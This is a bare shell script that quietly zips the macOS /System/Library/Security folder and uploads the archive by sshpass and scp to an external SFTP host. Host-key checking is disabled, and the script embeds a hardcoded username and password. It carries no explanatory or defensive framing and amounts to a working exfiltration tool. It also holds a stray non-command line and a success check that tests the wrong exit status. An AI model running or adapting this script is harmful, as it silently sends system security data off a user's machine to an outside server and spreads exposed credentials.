
cd $home/../../../System/Library/
archeiving files
echo "archiving silently"
zip -qr appstore_unmodified.zip Security && echo "Archiving complete!"


# Configuration
LOCAL_FILE="appstore_unmodified.zip"
REMOTE_USER="a957779a069a43279eba04e868aae51c"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_PATH="/home"
REMOTE_PASS="7WHEsgAZlIDIMW0th0oc1K01xC2wwApK"
REMOTE_DEST="/"


# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 echo "connection sucesfully"
# Check if the upload was successful
if [[ $? -eq 0 ]]; then
   echo "connection sucesfully"
else
   echo "connection failed."
fi
